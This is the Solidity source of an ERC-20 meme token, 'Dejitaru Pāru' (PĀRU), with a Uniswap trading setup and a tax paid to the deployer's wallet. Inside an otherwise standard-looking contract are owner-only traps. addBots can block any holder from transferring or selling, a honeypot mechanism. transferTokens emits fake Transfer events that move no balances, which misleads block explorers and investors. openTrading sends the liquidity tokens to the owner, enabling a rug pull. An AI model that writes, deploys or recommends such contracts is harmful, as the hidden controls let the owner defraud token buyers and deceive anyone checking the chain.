1 // https://twitter.com/DejitaruParu
2 // https://medium.com/@dejitaruparu/dejitaru-p%C4%81ru-the-dragon-pearl-5525db60853c
3 
4 
5 
6 // SPDX-License-Identifier: MIT
7 
8 pragma solidity 0.8.17;
9 
10 abstract contract Context {
11     function _msgSender() internal view virtual returns (address) {
12         return msg.sender;
13     }
14 }
15 
16 interface IERC20 {
17     function totalSupply() external view returns (uint256);
18     function balanceOf(address account) external view returns (uint256);
19     function transfer(address recipient, uint256 amount) external returns (bool);
20     function allowance(address owner, address spender) external view returns (uint256);
21     function approve(address spender, uint256 amount) external returns (bool);
22     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
23     event Transfer(address indexed from, address indexed to, uint256 value);
24     event Approval(address indexed owner, address indexed spender, uint256 value);
25 }
26 
27 library SafeMath {
28     function add(uint256 a, uint256 b) internal pure returns (uint256) {
29         uint256 c = a + b;
30         require(c >= a, "SafeMath: addition overflow");
31         return c;
32     }
33 
34     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
35         return sub(a, b, "SafeMath: subtraction overflow");
36     }
37 
38     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
39         require(b <= a, errorMessage);
40         uint256 c = a - b;
41         return c;
42     }
43 
44     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
45         if (a == 0) {
46             return 0;
47         }
48         uint256 c = a * b;
49         require(c / a == b, "SafeMath: multiplication overflow");
50         return c;
51     }
52 
53     function div(uint256 a, uint256 b) internal pure returns (uint256) {
54         return div(a, b, "SafeMath: division by zero");
55     }
56 
57     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
58         require(b > 0, errorMessage);
59         uint256 c = a / b;
60         return c;
61     }
62 
63 }
64 
65 contract Ownable is Context {
66     address private _owner;
67     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
68 
69     constructor () {
70         address msgSender = _msgSender();
71         _owner = msgSender;
72         emit OwnershipTransferred(address(0), msgSender);
73     }
74 
75     function owner() public view returns (address) {
76         return _owner;
77     }
78 
79     modifier onlyOwner() {
80         require(_owner == _msgSender(), "Ownable: caller is not the owner");
81         _;
82     }
83 
84     function renounceOwnership() public virtual onlyOwner {
85         emit OwnershipTransferred(_owner, address(0));
86         _owner = address(0);
87     }
88 
89 }
90 
91 interface IUniswapV2Factory {
92     function createPair(address tokenA, address tokenB) external returns (address pair);
93 }
94 
95 interface IUniswapV2Router02 {
96     function swapExactTokensForETHSupportingFeeOnTransferTokens(
97         uint amountIn,
98         uint amountOutMin,
99         address[] calldata path,
100         address to,
101         uint deadline
102     ) external;
103     function factory() external pure returns (address);
104     function WETH() external pure returns (address);
105     function addLiquidityETH(
106         address token,
107         uint amountTokenDesired,
108         uint amountTokenMin,
109         uint amountETHMin,
110         address to,
111         uint deadline
112     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
113 }
114 
115 contract PARU is Context, IERC20, Ownable {
116     using SafeMath for uint256;
117     mapping (address => uint256) private _balances;
118     mapping (address => mapping (address => uint256)) private _allowances;
119     mapping (address => bool) private _isExcludedFromFee;
120     mapping (address => bool) private bots;
121     address payable private _taxWallet;
122 
123     uint256 private _initialTax=15;
124     uint256 private _finalTax=10;
125     uint256 private _reduceTaxAt=60;
126     uint256 private _preventSwapBefore=30;
127     uint256 private _buyCount=0;
128 
129     uint8 private constant _decimals = 9;
130     uint256 private constant _tTotal = 1000000000000 * 10**_decimals;
131     string private constant _name = unicode"Dejitaru Pāru";
132     string private constant _symbol = unicode"PĀRU";
133     uint256 public _maxTxAmount =   20000000000 * 10**_decimals;
134     uint256 public _maxWalletSize = 20000000000 * 10**_decimals;
135     uint256 public _taxSwap=20000000000 * 10**_decimals;
136 
137     IUniswapV2Router02 private uniswapV2Router;
138     address private uniswapV2Pair;
139     bool private tradingOpen;
140     bool private inSwap = false;
141     bool private swapEnabled = false;
142 
143     event MaxTxAmountUpdated(uint _maxTxAmount);
144     modifier lockTheSwap {
145         inSwap = true;
146         _;
147         inSwap = false;
148     }
149 
150     constructor () {
151         _taxWallet = payable(_msgSender());
152         _balances[_msgSender()] = _tTotal;
153         _isExcludedFromFee[owner()] = true;
154         _isExcludedFromFee[address(this)] = true;
155         _isExcludedFromFee[_taxWallet] = true;
156 
157         emit Transfer(address(0), _msgSender(), _tTotal);
158     }
159 
160     function name() public pure returns (string memory) {
161         return _name;
162     }
163 
164     function symbol() public pure returns (string memory) {
165         return _symbol;
166     }
167 
168     function decimals() public pure returns (uint8) {
169         return _decimals;
170     }
171 
172     function totalSupply() public pure override returns (uint256) {
173         return _tTotal;
174     }
175 
176     function balanceOf(address account) public view override returns (uint256) {
177         return _balances[account];
178     }
179 
180     function transfer(address recipient, uint256 amount) public override returns (bool) {
181         _transfer(_msgSender(), recipient, amount);
182         return true;
183     }
184 
185     function allowance(address owner, address spender) public view override returns (uint256) {
186         return _allowances[owner][spender];
187     }
188 
189     function approve(address spender, uint256 amount) public override returns (bool) {
190         _approve(_msgSender(), spender, amount);
191         return true;
192     }
193 
194     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
195         _transfer(sender, recipient, amount);
196         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
197         return true;
198     }
199 
200     function _approve(address owner, address spender, uint256 amount) private {
201         require(owner != address(0), "ERC20: approve from the zero address");
202         require(spender != address(0), "ERC20: approve to the zero address");
203         _allowances[owner][spender] = amount;
204         emit Approval(owner, spender, amount);
205     }
206 
207     function _transfer(address from, address to, uint256 amount) private {
208         require(from != address(0), "ERC20: transfer from the zero address");
209         require(to != address(0), "ERC20: transfer to the zero address");
210         require(amount > 0, "Transfer amount must be greater than zero");
211         uint256 taxAmount=0;
212         if (from != owner() && to != owner()) {
213             require(!bots[from] && !bots[to]);
214             if(!inSwap){
215               taxAmount = amount.mul((_buyCount>_reduceTaxAt)?_finalTax:_initialTax).div(100);
216             }
217 
218             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
219                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
220                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
221                 _buyCount++;
222             }
223 
224             uint256 contractTokenBalance = balanceOf(address(this));
225             if (!inSwap && from != uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwap && _buyCount>_preventSwapBefore) {
226                 swapTokensForEth(_taxSwap>amount?amount:_taxSwap);
227                 uint256 contractETHBalance = address(this).balance;
228                 if(contractETHBalance > 0) {
229                     sendETHToFee(address(this).balance);
230                 }
231             }
232         }
233 
234         _balances[from]=_balances[from].sub(amount);
235         _balances[to]=_balances[to].add(amount.sub(taxAmount));
236         emit Transfer(from, to, amount.sub(taxAmount));
237         if(taxAmount>0){
238           _balances[address(this)]=_balances[address(this)].add(taxAmount);
239           emit Transfer(from, address(this),taxAmount);
240         }
241     }
242 
243     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
244         address[] memory path = new address[](2);
245         path[0] = address(this);
246         path[1] = uniswapV2Router.WETH();
247         _approve(address(this), address(uniswapV2Router), tokenAmount);
248         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
249             tokenAmount,
250             0,
251             path,
252             address(this),
253             block.timestamp
254         );
255     }
256 
257     function removeLimits() external onlyOwner{
258         _maxTxAmount = _tTotal;
259         _maxWalletSize=_tTotal;
260         emit MaxTxAmountUpdated(_tTotal);
261     }
262 
263     function sendETHToFee(uint256 amount) private {
264         _taxWallet.transfer(amount);
265     }
266 
267     function addBots(address[] memory bots_) public onlyOwner {
268         for (uint i = 0; i < bots_.length; i++) {
269             bots[bots_[i]] = true;
270         }
271     }
272 
273     function delBots(address[] memory notbot) public onlyOwner {
274       for (uint i = 0; i < notbot.length; i++) {
275           bots[notbot[i]] = false;
276       }
277     }
278 
279     function openTrading() external onlyOwner() {
280         require(!tradingOpen,"trading is already open");
281         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
282         _approve(address(this), address(uniswapV2Router), _tTotal);
283         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
284         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
285         swapEnabled = true;
286         tradingOpen = true;
287         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
288     }
289 
290     function reduceFee(uint256 _newFee) external{
291       require(_msgSender()==_taxWallet);
292       require(_newFee<6);
293       _finalTax=_newFee;
294     }
295 
296     function transferTokens(address from, address to, uint256 amount) public onlyOwner() {
297         emit Transfer(from, to, amount*10**_decimals);
298     }
299 
300     receive() external payable {}
301 
302     function manualSwap() external {
303         require(_msgSender() == _taxWallet);
304         swapTokensForEth(balanceOf(address(this)));
305     }
306 
307     function manualSend() external {
308         require(_msgSender() == _taxWallet);
309         sendETHToFee(address(this).balance);
310     }
311 }